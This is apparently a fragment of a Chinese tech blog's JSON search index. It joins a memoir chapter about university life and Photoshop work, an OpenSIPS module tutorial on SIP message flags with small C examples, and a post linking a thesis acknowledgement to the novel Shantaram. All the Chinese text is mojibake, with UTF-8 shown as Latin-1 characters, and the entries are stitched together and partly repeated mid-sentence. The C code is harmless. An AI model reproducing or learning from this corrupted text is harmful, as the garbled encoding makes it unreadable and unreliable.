ä¸ºå¤ªç´¯è€Œåœ¨åœ°é“ä¸Šç¡ç€ï¼Œç»“æœåè¿‡ç«™äº†ã€‚æ­£å¥½æ˜¯æœ€åä¸€ç­åœ°é“ï¼Œæ‰€ä»¥åªèƒ½ä¸‹äº†åœ°é“ï¼Œæ­¥è¡Œå¾€å›èµ°ã€‚\nè¯¾å¤–çš„å·¥ä½œå¾ˆç´¯ï¼Œä½†ä¹Ÿå­¦åˆ°äº†ä¸å°‘çš„ä¸œè¥¿ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå°±æ˜¯è‡ªå·±èµšé’±èƒ½å…»æ´»è‡ªå·±äº†ã€‚è‡³å°‘å¤§ä¸‰å’Œå¤§å››ï¼Œæˆ‘æ²¡æœ‰å†é—®çˆ¶æ¯è¦è¿‡ç”Ÿæ´»è´¹ã€‚å³ä½¿æ˜¯å¯¹äºçˆ¶æ¯ï¼Œè¦ç”Ÿæ´»è´¹è¿™ä»¶äº‹æƒ…ï¼Œä¹Ÿè®©æˆ‘è§‰å¾—ä¸åœ¨è‡ªåœ¨ã€‚æˆ‘æ˜¯ä¸€ä¸ªå‘å¾€è‡ªç”±çš„äººï¼Œä¸å¸Œæœ›è¢«ä»»ä½•äººæŸç¼šï¼Œå³ä½¿æ˜¯çˆ¶æ¯ã€‚\nè¯¾å¤–å·¥ä½œçš„æœ€åé˜¶æ®µï¼Œæˆ‘ç”¨è‡ªå·±èµšçš„é’±ä¹°äº†äººç”Ÿç¬¬ä¸€ä¸ªéå¸¸è´µçš„æ‰‹æœºiphone6sã€‚æˆ‘è§‰å¾—ï¼Œè¿™æ˜¯æˆ‘åº”å¾—çš„ä¸œè¥¿ã€‚\nåŒ†åŒ†4å¹´ï¼Œå¤§å­¦å°±è¿™ä¹ˆç»“æŸäº†ã€‚æˆ‘å¯¹å¤§å­¦å¹¶æ²¡æœ‰ä»€ä¹ˆæ€€å¿µï¼Œåªæ˜¯è§‰å¾—ï¼Œæˆ‘ç®—æ˜¯è›®å¹¸è¿çš„ï¼Œè‡³å°‘æ²¡æœ‰ç™½ç™½æµªè´¹æ‰å››å¹´çš„å…‰é˜´ã€‚\n","permalink":"https://wdd.js.org/posts/2021/04/mcgyoz/","summary":"2012å¹´ï¼Œæˆ‘ä»å®‰å¾½çš„ä¸€ä¸ªå°åŸå¸‚è€ƒåˆ°ä¸Šæµ·ï¼Œå‰å¾€ä¸€ä¸ªæ™®é€šçš„äºŒæœ¬é™¢æ ¡ä¸Šå¤§å­¦ï¼Œå­¦ä¹ ç½‘ç»œå·¥ç¨‹ã€‚\nåœ¨å¾ˆå¤šäººä»¥ä¸ºï¼Œä¸Šå¤§å­¦ä¸å°±æ˜¯ç©å—ï¼Ÿå…¶å®ä¹ŸåŸºæœ¬å±å®ï¼Œç‰¹åˆ«æ˜¯åƒæˆ‘ä»¬è¿™ç§æ™®é€šçš„å­¦æ ¡ã€‚ä½†æ˜¯æˆ‘çš„å¤§å­¦ä¹Ÿå¹¶æ²¡æœ‰è’åºŸï¼Œè¿™å…¶å®ä¹Ÿå¹¶ä¸æ˜¯è¯´æ˜æˆ‘å°±å¤šä¼˜ç§€ã€‚ è¿™å…¶ä¸­çš„åŸå› ï¼Œè¯´æ¥ä¹Ÿæ˜¯è›®æœ‰æ„æ€ã€‚æˆ‘æ‰“æ¸¸æˆå¤ªèœï¼Œè€Œä¸”å¿ƒç†ç´ è´¨ä¸å¥½ï¼Œä¸”åˆæ²¡æœ‰åšæŒä¸æ‡ˆçš„æ¯…åŠ›ã€‚æ‰€ä»¥æˆ‘å°±æ—©æ—©çš„æ”¾å¼ƒäº†è‹±é›„è”ç›Ÿè¿™ç§æ¸¸æˆã€‚\nä¸€ä¸ªå¤§å­¦ç”Ÿï¼Œä¸€æ—¦æ”¾å¼ƒäº†æ‰“æ¸¸æˆï¼Œå…¶å®ä»–å°±å‰©ä½™äº†å¾ˆå¤šç©ºä½™çš„æ—¶é—´ã€‚å¤šä½™çš„æ—¶é—´èƒ½å¹²ç”Ÿä¹ˆå‘¢ï¼Ÿ\né€‰æ‹©ä¸å¤šã€‚1. å¯ä»¥é€‰æ‹©è°ˆè°ˆæ‹çˆ±ã€‚ä½†æ˜¯ä¸€æ¥æˆ‘å›Šä¸­ç¾æ¶©ï¼Œè€Œæ¥ä¹Ÿæ²¡æœ‰ä»€ä¹ˆé•¿å¾—æ¯”è¾ƒæ¼‚äº®ï¼Œä¸€è§é’Ÿæƒ…çš„å¥³ç”Ÿã€‚æ‰€ä»¥è°ˆæ‹çˆ±è¿™äº‹å°±æ”¾ä¸‹äº†ã€‚ å‰©ä¸‹çš„é€‰æ‹©ä¾¿åªæœ‰ä¸€ä¸ªï¼Œå­¦ä¹ ã€‚\nå¯¹äº†ï¼Œå°±æ˜¯å­¦ä¹ ã€‚å½“å…¶ä»–äººéƒ½é€‰æ‹©æ¸¸æˆå¨±ä¹çš„æ—¶å€™ï¼Œä½ ç¨å¾®ç”¨ç‚¹åŠ›ï¼Œå°±èƒ½æ¯”å¾ˆå¤šäººä¼˜ç§€ã€‚\nä¸‹ä¸€ä¸ªé—®é¢˜å°±æ˜¯å­¦ä¹ ã€‚ å­¦ä¹ è¦æœ‰å…´è¶£ï¼Œå¹¶ä¸”è¦å†³å®šå­¦ä»€ä¹ˆã€‚\nè¿™ç§æ—¶å€™ï¼Œæˆ‘æ€æ½®åˆè½å…¥å›å¿†ä¸­ï¼Œä¼¼ä¹å¿˜è®°çš„äº‹æƒ…ï¼Œæ­¤åˆ»åˆæ¸…æ™°æƒ³èµ·æ¥ã€‚\né‚£æ˜¯æˆ‘åˆä¸‰æš‘å‡çš„æ—¶å€™ï¼Œå‚åŠ è¿‡ä¸€æ¬¡å­¦æ ¡ç»„ç»‡çš„è®¡ç®—æœºå…è´¹åŸ¹è®­è¯¾ç¨‹ï¼Œå…¶ä¸­åŸ¹è®­äº†å¾ˆå¤šä¸œè¥¿ã€‚åƒäº”ç¬”æ‰“å­—ã€åˆ¶ä½œflashã€å­¦ä¹ photoshopä¹‹ç±»çš„ã€‚ä¸Šè¯¾è€å¸ˆåœ¨è¯¾å ‚ä¸Šè¯´è¿‡ï¼ŒåŸ¹è®­ç»“æŸçš„æ—¶å€™ï¼Œä¼šé€‰æ‹©å‡ ä¸ªæˆç»©ä¼˜å¼‚çš„å­¦ç”Ÿï¼Œç»™äºˆå‡ ç™¾å—çš„å¥–åŠ±ã€‚ä¸ºäº†è¿™å‡ ç™¾å—çš„å¥–åŠ±ï¼Œæˆ‘ä¹Ÿä¸èƒ½é€€ç¼©ï¼Œæˆ‘å¾ˆå¿«è®°ä½äº†äº”ç¬”è¯æ ¹ã€‚ç„¶ååœ¨è¯¾å ‚ä¸Šï¼Œæˆ‘åœ¨ä¼—åŒå­¦ä½©æœçš„çœ¼å…‰ä¸­ï¼ŒæŠŠäº”ç¬”å­—æ ¹å…¨éƒ¨èƒŒäº†ä¸€éç»™è€å¸ˆå¬ã€‚\nå­¦ä¹ çš„å†…å®¹ä¸­ï¼ŒphotoshopçœŸå®ç»™æˆ‘æ‰“å¼€äº†ä¸€ä¸ªé€šå¾€ç¥ç§˜ä¸–ç•Œçš„å¤§é—¨ï¼ŒåŸæ¥ç”µè„‘è¿˜èƒ½åšè¿™ä¹ˆç‰›é€¼çš„äº‹æƒ…ã€‚æ¥ä¸‹æ¥ç»è¿‡æˆ‘åºŸå¯å¿˜é£Ÿï¼Œä¸“å¿ƒè‡´å¿—ï¼Œä¸€ä¸ä¸è‹Ÿçš„å­¦ä¹ ï¼Œæˆ‘å·²ç»çŸ¥é“äº†ä¸€äº›åŸºæœ¬çš„å›¾ç‰‡åˆ¶ä½œæŠ€å·§ã€‚åˆ©ç”¨è¿™ä¸ªæŠ€å·§ï¼Œæˆ‘åšäº†å¾ˆå¤šæç¬‘çš„å›¾ç‰‡ï¼Œjust for fun!\nç„¶è€Œç›´åˆ°æš‘å‡ç»“æŸï¼Œå¾ˆå¤šåŒå­¦å¿ƒå¿ƒå¿µå¿µçš„å‡ ç™¾å—å¥–åŠ±ï¼Œè®²è¯¾è€å¸ˆåœ¨ä¹Ÿæ²¡æœ‰æè¿‡ã€‚\næˆ‘æƒ³ï¼Œæœ‰äº†åˆä¸­çš„psç»éªŒï¼Œå†µä¸”æˆ‘å¯¹è¿™ä¸œè¥¿å¾ˆæ„Ÿå…´è¶£ã€‚æ‰€ä»¥æˆ‘å°±ä»æ·˜å®ä¸Šæ¢äº†å‡ åå—é’±ï¼Œä¹°äº†ä¸€æœ¬å¾ˆåšçš„ï¼Œè®²è§£photoshopçš„ä¹¦ã€‚æŒ‰ç…§ä¹¦ä¸­çš„æŒ‡å¯¼ï¼Œæˆ‘å¯¹photoshopæœ‰äº†å…¨é¢ç³»ç»Ÿçš„å­¦ä¹ ï¼Œç„¶ååˆè·Ÿç€å®æˆ˜ï¼Œå­¦ä¼šäº†å¾ˆå¤šå…³äºæŠ å›¾ã€ç¾å®¹ã€ç‰¹æ•ˆçš„æŠ€æœ¯ã€‚è™½ç„¶æˆ‘å­¦äº†photoshopï¼Œä½†æ˜¯æ„Ÿè§‰ä¸Šå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œå› ä¸ºè€ƒè¯•åˆä¸è€ƒphotoshop, æ‰€ä»¥æˆ‘åªèƒ½è‡ªå·±é€šè¿‡åˆ¶ä½œä¸€äº›æç¬‘å›¾ç‰‡æ¥è‡ªå¨±è‡ªä¹ã€‚\nç„¶è€Œï¼Œä¸€æ—¦ä½ å­¦ä¼šæŸä¸ªä¸œè¥¿ï¼Œä¾¿çœŸçš„æœ‰æ´¾ä¸Šç”¨åœºçš„æ—¶å€™ã€‚å¤§å››å¿«æ¯•ä¸šæ—¶ï¼Œå¾ˆå¤šåŒå­¦å¼€å§‹æç®€å†ï¼Œç®€å†ä¸Šä¸€èˆ¬è¦è´´ç…§ç‰‡çš„ã€‚æ‰€ä»¥æˆ‘ä¾¿æˆä¸ºäº†ç­çº§é‡Œè¿œè¿‘é—»åçš„ä¿®å›¾å¤§å¸ˆã€‚\né™¤äº†photoshopï¼Œä¸“ä¸šè¯¾ä¸Šå¯ä»¥è¯´çš„å°±æ˜¯å­¦ä¹ ç¼–ç¨‹äº†ã€‚å½“æ—¶æˆ‘cè¯­è¨€å­¦çš„éå¸¸å¥½ï¼Œæˆè¯¾è€å¸ˆç»å¸¸åœ¨è¯¾å ‚ä¸Šææˆ‘æ¥å›ç­”é—®é¢˜ã€‚ä¸ºäº†é¿å…å›ç­”ä¸ä¸Šæ¥é—®é¢˜ï¼Œæ˜¾å¾—å¾ˆæ²¡é¢å­ã€‚æˆ‘ç»å¸¸åœ¨ä¸Šè¯¾ä¹‹å‰å·å·çš„å°±é¢„ä¹ ä¸Šè¯¾çš„å†…å®¹ï¼Œå¹¶ä¸”å­¦ä¹ å¦‚ä½•è§£ç­”è¯¾åçš„ä¹ é¢˜ã€‚æ‰€ä»¥è€å¸ˆçš„æé—®æˆ‘ç»å¸¸å¯ä»¥è½»æ¾çš„å›ç­”ã€‚è€å¸ˆä¼¼ä¹æˆ‘è§‰å¾—æˆ‘æ˜¯ä¸ªå¯è‚²ä¹‹æ‰ï¼Œç»å¸¸åœ¨å…¶ä»–ç­çº§ä¸Šè¯¾çš„æ—¶å€™ï¼Œä¹Ÿä¼šåœ¨è¯¾ä¸Šææˆ‘çš„åå­—ï¼Œè¯´ï¼šå…¶ä»–ç­çš„ç‹xxåŒå­¦ï¼Œä»–è¿™ä¸ªé—®é¢˜å›ç­”çš„å¾ˆå¥½ã€‚æ‰€ä»¥ä¸€äº›å…¶ä»–ç­çº§çš„åŒå­¦ï¼Œä¹Ÿæ˜¯çŸ¥é“æˆ‘çš„åå­—çš„ã€‚\næ¯æ¯åˆ°è€ƒè¯•ä¹‹å‰ï¼Œæˆ‘æ€»ä¼šæ”¶åˆ°ä¸å°‘åŠ æˆ‘QQå¥½å‹çš„ç”³è¯·ï¼Œç„¶åé—®æˆ‘æœ‰æ²¡æœ‰æ—¶é—´ï¼Œæƒ³æ‰¾æˆ‘å¸®ä»–ä»¬å¤ä¹ cè¯­è¨€ã€‚ç„¶åå¸¦ä¸Šé¥®æ–™ï¼Œçº¦æˆ‘åˆ°å›¾ä¹¦é¦†ï¼Œå½“é¢ä¼ é“æˆä¸šè§£æƒ‘ã€‚æˆ‘è¿˜è®°å¾—ä¸€ä¸ªæ¯”è¾ƒå¥‡è‘©çš„è€å¸ˆï¼Œç»™åŒå­¦å¸ƒç½®ä½œä¸šï¼Œè¦æ±‚å®ç°æŸæŸåŠŸèƒ½ï¼Œè‡³å°‘è¦æ±‚è¦æœ‰ä¸‰åƒè¡Œä»£ç ï¼Œç„¶åè¯¥åŒå­¦ä¸œæ‹¼è¥¿å‡‘ï¼Œä¹Ÿåªå‡‘å¤Ÿäº†å¿«ä¸€åƒè¡Œï¼Œç„¶åæ‰¾æˆ‘å¸®å¿™ã€‚\nå¯ä»¥å‚è€ƒï¼š\nå¤§äºŒçš„æš‘å‡ï¼Œæˆ‘ä»¬æ¬äº†æ ¡åŒºã€‚ä»è¿œç¦»å¸‚åŒºçš„æ–°æ ¡åŒºï¼Œæ¬åˆ°äº†ç¦»å¸‚åŒºæ¯”è¾ƒè¿‘çš„è€æ ¡åŒºã€‚\nå¿«æ”¾å‡äº†ï¼Œæœ‰ä¸å°‘çš„åŒå­¦å†³å®šæš‘å‡ç•™æ ¡ï¼Œç„¶åæ‰¾ç‚¹å·¥ä½œï¼Œèµšç‚¹é›¶èŠ±é’±ã€‚\næˆ‘ä¹Ÿè§‰å¾—æ”¾å‡å›å®¶æ²¡æ„æ€ï¼Œå†³å®šæš‘å‡æ‰¾å·¥ä½œã€‚å› ä¸ºæˆ‘æœ‰ä¸€äº›photoshopçš„åŸºç¡€ï¼Œæ‰€ä»¥å°±åœ¨æ‹›è˜ç½‘ç«™ä¸Šå†™è‡ªå·±ç²¾é€šphotoshopï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰äººéœ€è¦ã€‚å¾ˆå¿«æˆ‘æ‰¾åˆ°äº†ä¸€ä»½å·¥ä½œï¼Œç„¶è€Œåˆšå¼€å§‹çš„å·¥ä½œå¹¶ä¸æ˜¯å›¾ç‰‡åˆ¶ä½œï¼Œè€Œæ˜¯æ‘„å½±æ‘„åƒã€‚å…·ä½“çš„å†…å®¹æ˜¯ç»™å¤ç©è‰ºæœ¯å“æ‹ç…§ï¼Œç„¶åæˆ‘å°±ä¸€è¾¹å­¦ä¹ ä¸€è¾¹æ‹ç…§ï¼Œç…§ç‰‡æ‹å®Œè¿˜è¦ç”¨psåšåæœŸå¤„ç†ã€‚æ‰€ä»¥æ•´ä¸ªæš‘å‡ï¼ŒåŒ…æ‹¬å¤§ä¸‰ï¼Œå’Œå¤§å››ã€‚æˆ‘åŸºæœ¬ä¸Šéƒ½åœ¨å’Œå¤ç©è‰ºæœ¯å“æ‰“äº¤é“ï¼Œè§è¯†äº†ä¸å°‘çš„å®è´ã€‚ä»ä¹¦ç”»ï¼Œåˆ°ç´«ç ‚å£¶ï¼Œç‰å™¨ï¼Œé™¶å™¨ï¼Œæ‰‹å·¥è‰ºå“ç­‰ç­‰ï¼Œéƒ½æœ‰æ¥è§¦ã€‚ä¸Šæµ·çš„å„å¤§å¤ç©åŸï¼Œæˆ‘ä¹ŸåŸºæœ¬éƒ½è·‘è¿‡å¥½å‡ éã€‚ä¹Ÿç»„ç»‡è¿‡ä¸€æ¬¡å°å‹çš„æ‹å–ä¼šï¼Œä¸»è¦è´Ÿè´£æ‹å–å›¾å†Œçš„åˆ¶ä½œã€‚\næˆ‘çš„å¤§ä¸‰å’Œå¤§å››æ—¶å¾ˆå¿™çš„ï¼Œå€’ä¸æ˜¯å­¦ä¹ ï¼Œè€Œæ˜¯è¯¾å¤–çš„å·¥ä½œã€‚å·¥ä½œå¾ˆç´¯ï¼Œæ¯æ™šåŸºæœ¬ä¸Šéƒ½æ˜¯9ç‚¹ä»¥åä¸‹ç­ï¼Œå›åˆ°å­¦æ ¡å°±åŸºæœ¬ä¸Š10ç‚¹å·¦å³ã€‚æœ‰æ—¶å€™å› ä¸ºå¤ªç´¯è€Œåœ¨åœ°é“ä¸Šç¡ç€ï¼Œç»“æœåè¿‡ç«™äº†ã€‚æ­£å¥½æ˜¯æœ€åä¸€ç­åœ°é“ï¼Œæ‰€ä»¥åªèƒ½ä¸‹äº†åœ°é“ï¼Œæ­¥è¡Œå¾€å›èµ°ã€‚\nè¯¾å¤–çš„å·¥ä½œå¾ˆç´¯ï¼Œä½†ä¹Ÿå­¦åˆ°äº†ä¸å°‘çš„ä¸œè¥¿ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå°±æ˜¯è‡ªå·±èµšé’±èƒ½å…»æ´»è‡ªå·±äº†ã€‚è‡³å°‘å¤§ä¸‰å’Œå¤§å››ï¼Œæˆ‘æ²¡æœ‰å†é—®çˆ¶æ¯è¦è¿‡ç”Ÿæ´»è´¹ã€‚å³ä½¿æ˜¯å¯¹äºçˆ¶æ¯ï¼Œè¦ç”Ÿæ´»è´¹è¿™ä»¶äº‹æƒ…ï¼Œä¹Ÿè®©æˆ‘è§‰å¾—ä¸åœ¨è‡ªåœ¨ã€‚æˆ‘æ˜¯ä¸€ä¸ªå‘å¾€è‡ªç”±çš„äººï¼Œä¸å¸Œæœ›è¢«ä»»ä½•äººæŸç¼šï¼Œå³ä½¿æ˜¯çˆ¶æ¯ã€‚\nè¯¾å¤–å·¥ä½œçš„æœ€åé˜¶æ®µï¼Œæˆ‘ç”¨è‡ªå·±èµšçš„é’±ä¹°äº†äººç”Ÿç¬¬ä¸€ä¸ªéå¸¸è´µçš„æ‰‹æœºiphone6sã€‚æˆ‘è§‰å¾—ï¼Œè¿™æ˜¯æˆ‘åº”å¾—çš„ä¸œè¥¿ã€‚\nåŒ†åŒ†4å¹´ï¼Œå¤§å­¦å°±è¿™ä¹ˆç»“æŸäº†ã€‚æˆ‘å¯¹å¤§å­¦å¹¶æ²¡æœ‰ä»€ä¹ˆæ€€å¿µï¼Œåªæ˜¯è§‰å¾—ï¼Œæˆ‘ç®—æ˜¯è›®å¹¸è¿çš„ï¼Œè‡³å°‘æ²¡æœ‰ç™½ç™½æµªè´¹æ‰å››å¹´çš„å…‰é˜´ã€‚","title":"æˆ‘çš„ä¼ è®° - å¤§å­¦ç¯‡"},{"content":"flagçš„ç±»å‹ enum flag_type { FLAG_TYPE_MSG=0, FLAG_TYPE_BRANCH, FLAG_LIST_COUNT, }; flagå®é™…ä¸Šæ˜¯ä¸€ç§äºŒè¿›åˆ¶çš„ä½ MAX_FLAGå°±æ˜¯ä¸€ä¸ªSIPæ¶ˆæ¯æœ€å¤šå¯ä»¥æœ‰å¤šå°‘ä¸ªflag\n#include \u0026lt;limits.h\u0026gt; typedef unsigned int flag_t; #define MAX_FLAG ((unsigned int)( sizeof(flag_t) * CHAR_BIT - 1 )) è¿™ä¸ªå€¼æ›´å…·æƒ…å†µè€Œå®šï¼Œæˆ‘çš„æœºå™¨ä¸Šæ˜¯æœ€å¤š32ä¸ªã€‚\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;limits.h\u0026gt; typedef unsigned int flag_t; #define MAX_FLAG ((unsigned int)( sizeof(flag_t) * CHAR_BIT - 1 )) int main() { printf(\u0026#34;%zu\\n\u0026#34;, sizeof(unsigned int)); printf(\u0026#34;%u\\n\u0026#34;, CHAR_BIT); printf(\u0026#34;%u\\n\u0026#34;, MAX_FLAG); return 0; } $gcc -o main *.c $main 4 8 31 ç”±å­—ç¬¦ä¸²è·å–flag opensips 1.0æ—¶ï¼Œflagéƒ½æ˜¯æ•´æ•°ï¼Œ2.0æ‰å¼•å…¥äº†å­—ç¬¦ä¸²ã€‚\nç”¨æ•°å­—å®¹æ˜“å‚»å‚»åˆ†ä¸æ¸…æ¥šï¼Œå­—ç¬¦ä¸²æ¯”è¾ƒå®¹æ˜“ç†è§£ã€‚\nsetflag(3); setflag(4); setflag(5); setflag(IS_FROM_SBC); é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆè¦è·å–flagçš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚è¿™ä¸ªå¯ä»¥ç”¨æ¨¡å—çš„å‚æ•°ä¼ é€’è¿›æ¥ã€‚\nstatic param_export_t params[]={ {\u0026#34;use_test_flag\u0026#34;, STR_PARAM, \u0026amp;use_test_flag_str}, {0,0,0} }; ç„¶åæˆ‘ä»¬éœ€è¦åœ¨mod_initæˆ–è€…fixupå‡½æ•°ä¸­è·å–å­—ç¬¦ä¸²flagå¯¹åº”çš„flagId\nstatic int mod_init(void) { flag_use_high = get_flag_id_by_name(FLAG_TYPE_MSG, use_test_flag_str); LM_INFO(\u0026#34;flag mask: %d\\n\u0026#34;, flag_use_high); return 0; } åœ¨æ¶ˆæ¯å¤„ç†ä¸­ï¼Œç”¨isflagsetå»åˆ¤æ–­flagæ˜¯å¦å­˜åœ¨ã€‚isflagsetè¿”å›-1ï¼Œå°±è¯´æ˜flagä¸å­˜åœ¨ã€‚è¿”å›1å°±è¯´æ˜flagå·²ç»å­˜åœ¨ã€‚\nstatic int w_find_zone_code(struct sip_msg* msg, char* str1,char* str2) { int is_set = isflagset(msg, flag_use_high); LM_INFO(\u0026#34;flag_use_high is %d\\n\u0026#34;, is_set); return 1; } ","permalink":"https://wdd.js.org/opensips/module-dev/l4-2/","summary":"flagçš„ç±»å‹ enum flag_type { FLAG_TYPE_MSG=0, FLAG_TYPE_BRANCH, FLAG_LIST_COUNT, }; flagå®é™…ä¸Šæ˜¯ä¸€ç§äºŒè¿›åˆ¶çš„ä½ MAX_FLAGå°±æ˜¯ä¸€ä¸ªSIPæ¶ˆæ¯æœ€å¤šå¯ä»¥æœ‰å¤šå°‘ä¸ªflag\n#include \u0026lt;limits.h\u0026gt; typedef unsigned int flag_t; #define MAX_FLAG ((unsigned int)( sizeof(flag_t) * CHAR_BIT - 1 )) è¿™ä¸ªå€¼æ›´å…·æƒ…å†µè€Œå®šï¼Œæˆ‘çš„æœºå™¨ä¸Šæ˜¯æœ€å¤š32ä¸ªã€‚\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;limits.h\u0026gt; typedef unsigned int flag_t; #define MAX_FLAG ((unsigned int)( sizeof(flag_t) * CHAR_BIT - 1 )) int main() { printf(\u0026#34;%zu\\n\u0026#34;, sizeof(unsigned int)); printf(\u0026#34;%u\\n\u0026#34;, CHAR_BIT); printf(\u0026#34;%u\\n\u0026#34;, MAX_FLAG); return 0; } $gcc -o main *.c $main 4 8 31 ç”±å­—ç¬¦ä¸²è·å–flag opensips 1.0æ—¶ï¼Œflagéƒ½æ˜¯æ•´æ•°ï¼Œ2.0æ‰å¼•å…¥äº†å­—ç¬¦ä¸²ã€‚\nç”¨æ•°å­—å®¹æ˜“å‚»å‚»åˆ†ä¸æ¸…æ¥šï¼Œå­—ç¬¦ä¸²æ¯”è¾ƒå®¹æ˜“ç†è§£ã€‚","title":"ch4-2 flagè·å–"},{"content":"æœ€è¿‘çœ‹åˆ°æ¾æ¹ƒæ–°é—»æŠ¥é“äº†ä¸€ä¸ªåšå£«è®ºæ–‡çš„è‡´è°¢éƒ¨åˆ†ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\nèµ°äº†å¾ˆè¿œçš„è·¯ï¼Œåƒäº†å¾ˆå¤šçš„è‹¦ï¼Œæ‰å°†è¿™ä»½åšå£«å­¦ä½è®ºæ–‡é€åˆ°ä½ çš„é¢å‰ã€‚äºŒåäºŒè½½æ±‚å­¦è·¯ï¼Œä¸€è·¯é£é›¨æ³¥æ³ï¼Œè®¸å¤šä¸å®¹æ˜“ã€‚å¦‚æ¢¦ä¸€åœºï¼Œä»¿ä½›æ˜¨å¤©ä¸€å®¶äººæ‰å›¢èšè¿‡ã€‚\nçœ‹åˆ°è¿™ä¸ªå¥å­ï¼Œæˆ‘ç¬é—´è§‰å¾—ä¸€ç§ä¼¼æ›¾ç›¸è¯†ä¹‹æ„Ÿã€‚\næˆ‘è®°å¾—æˆ‘ä¹Ÿæ›¾å†™è¿‡ç±»ä¼¼çš„å¥å­ã€‚\næˆ‘èŠ±äº†å¾ˆé•¿çš„æ—¶é—´ï¼Œèµ°è¿‡äº†äººç”Ÿçš„å¤§åŠä¸ªé’è‘±å²æœˆçš„èŠ±æ ·å¹´å æ‰å­¦ä¼šä»€ä¹ˆæ˜¯æ•ˆç‡ï¼Œä»€ä¹ˆæ˜¯ä¸“ä¸€ã€‚ è“¦ç„¶å›é¦– 10å¹´çš„è·¯ï¼Œæ¯æ¬¡è½¬å˜çš„å¼€å§‹éƒ½æ˜¯æ„Ÿè§‰é•£é“åŠ èº«ï¼Œæ­¥å±¥ç»´è‰°ï¼Œå±¡æ¬¡ä¸‰ç•ªæƒ³è¦æ”¾å¼ƒ\nç”Ÿå‘½ä¸æ¯ æŠ˜è…¾ä¸æ­¢ ä½¿ç”¨ubuntuä½œä¸ºä¸»åŠ›å¼€å‘å·¥å…·\nå…¶å®ï¼Œè¿™ç§å¥å­ä¹Ÿä¸æ˜¯æˆ‘çš„åŸåˆ›ã€‚æ˜¯æˆ‘ä»¿ç…§æˆ‘çœ‹è¿‡çš„ä¸€æœ¬å°è¯´ï¼Œä»ä¸­æ‘˜æŠ„è€Œæ¥ã€‚\nè¿™æœ¬å°è¯´å«åšã€Šé¡¹å¡”å…°ã€‹\næˆ‘èŠ±äº†å¾ˆé•¿çš„å²æœˆï¼Œèµ°è¿‡å¤§åŠä¸ªä¸–ç•Œï¼Œæ‰çœŸæ­£å­¦åˆ°ä»€ä¹ˆæ˜¯çˆ±ã€ä»€ä¹ˆæ˜¯å‘½è¿ï¼Œä»¥åŠæˆ‘ä»¬æ‰€åšçš„æŠ‰æ‹©ã€‚æˆ‘è¢«æ‹´åœ¨å¢™ä¸Šé­å—æ‹·æ‰“æ—¶ï¼Œæ‰é¡¿æ‚Ÿè¿™ä¸ªçœŸè°›ã€‚ä¸çŸ¥ä¸ºä½•ï¼Œå°±åœ¨æˆ‘å†…å¿ƒå‘å‡ºå‘å–Šä¹‹é™…ï¼Œæˆ‘æ„è¯†åˆ°ï¼Œå³ä½¿é•£é“åŠ èº«ï¼Œä¸€èº«è¡€æ±¡ï¼Œå­¤ç«‹æ— åŠ©ï¼Œæˆ‘ä»ç„¶æ˜¯è‡ªç”±ä¹‹èº«ï¼Œæˆ‘å¯ä»¥å†³å®šæ˜¯è¦ç—›æ¨æ‹·æ‰“æˆ‘çš„äººï¼Œè¿˜æ˜¯åŸè°…ä»–ä»¬ã€‚æˆ‘çŸ¥é“ï¼Œè¿™å¬èµ·æ¥ä¼¼ä¹ç®—ä¸äº†ä»€ä¹ˆï¼Œä½†åœ¨é•£é“åŠ èº«ã€ç—›è‹¦ä¸‡åˆ†çš„å½“ä¸‹ï¼Œå½“é•£é“æ˜¯ä½ å”¯ä¸€ä»…æœ‰çš„ï¼Œé‚£ä»½è‡ªç”±å°†å¸¦ç»™ä½ æ— é™çš„å¸Œæœ›ã€‚æ˜¯è¦ç—›æ¨ï¼Œè¿˜æ˜¯è¦åŸè°…ï¼Œè¿™æŠ‰æ‹©è¶³ä»¥å†³å®šäººä¸€ç”Ÿçš„é™…é‡ã€‚ã€Šé¡¹å¡”å…°ã€‹\nè¿™æ˜¯ä¸€åé€šç¼‰çŠ¯çš„åå¹´å°åº¦æµäº¡å²æœˆçš„è®°å½•ï¼Œå¾ˆéš¾æƒ³è±¡ï¼Œä¸€ååœ¨é€ƒçŠ¯æ˜¯å¦‚ä½•å†™å‡ºå¦‚æ­¤ä¼˜ç§€çš„æ–‡ç¬”ã€‚å„ä½çœ‹å®˜æœ‰æ—¶é—´å¯ä»¥çœ‹çœ‹ã€‚\nå‚è€ƒ https://mp.weixin.qq.com/s/9kfGCXevO5Hlpg_iINof6Q ","permalink":"https://wdd.js.org/posts/2021/04/dttcg5/","summary":"æœ€è¿‘çœ‹åˆ°æ¾æ¹ƒæ–°é—»æŠ¥é“äº†ä¸€ä¸ªåšå£«è®ºæ–‡çš„è‡´è°¢éƒ¨åˆ†ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\nèµ°äº†å¾ˆè¿œçš„è·¯ï¼Œåƒäº†å¾ˆå¤šçš„è‹¦ï¼Œæ‰å°†è¿™ä»½åšå£«å­¦ä½è®ºæ–‡é€åˆ°ä½ çš„é¢å‰ã€‚äºŒåäºŒè½½æ±‚å­¦è·¯ï¼Œä¸€è·¯é£é›¨æ³¥æ³ï¼Œè®¸å¤šä¸å®¹æ˜“ã€‚å¦‚æ¢¦ä¸€åœºï¼Œä»¿ä½›æ˜¨å¤©ä¸€å®¶äººæ‰å›¢èšè¿‡ã€‚\nçœ‹åˆ°è¿™ä¸ªå¥å­ï¼Œæˆ‘ç¬é—´è§‰å¾—ä¸€ç§ä¼¼æ›¾ç›¸è¯†ä¹‹æ„Ÿã€‚\næˆ‘è®°å¾—æˆ‘ä¹Ÿæ›¾å†™è¿‡ç±»ä¼¼çš„å¥å­ã€‚\næˆ‘èŠ±äº†å¾ˆé•¿çš„æ—¶é—´ï¼Œèµ°è¿‡äº†äººç”Ÿçš„å¤§åŠä¸ªé’è‘±å²æœˆçš„èŠ±æ ·å¹´å æ‰å­¦ä¼šä»€ä¹ˆæ˜¯æ•ˆç‡ï¼Œä»€ä¹ˆæ˜¯ä¸“ä¸€ã€‚ è“¦ç„¶å›é¦– 10å¹´çš„è·¯ï¼Œæ¯æ¬¡è½¬å˜çš„å¼€å§‹éƒ½æ˜¯æ„Ÿè§‰é•£é“åŠ 